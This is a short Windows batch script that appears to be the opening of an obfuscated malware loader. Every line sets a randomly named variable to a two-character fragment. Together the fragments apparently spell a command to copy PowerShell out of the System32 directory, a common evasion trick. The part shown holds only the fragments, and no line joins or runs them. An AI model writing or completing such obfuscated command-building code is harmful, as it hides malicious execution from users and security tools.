@echo off
set "vNkxxNJufP=ow"
set "JNNDmFXxNR=py"
set "CTAnVHnDIJ=32"
set "oAQyKPsMbk=y "
set "hWetywonOJ=:\"
set "RzmHzYEkRd=0\"
set "wNovrYIAkm=Wi"
set "CqoZwlscdW=1."
set "iQWjpYWHuf=rS"
set "IdLgHJxdFF=co"
set "RrZKietUcM=po"
set "tuqInyNWKx=nd"
set "hnnegZgsQK=\W"
set "lquZpueldL= /"
set "TeBLSxVbwO=rs"
set "RyaqHhjukX=ll"
set "XhJWNNvnoO=\v"
set "IrDqoJCRYE=st"
set "RjlMsmhEHJ=ll"
set "oJqRxBUlqh=we"
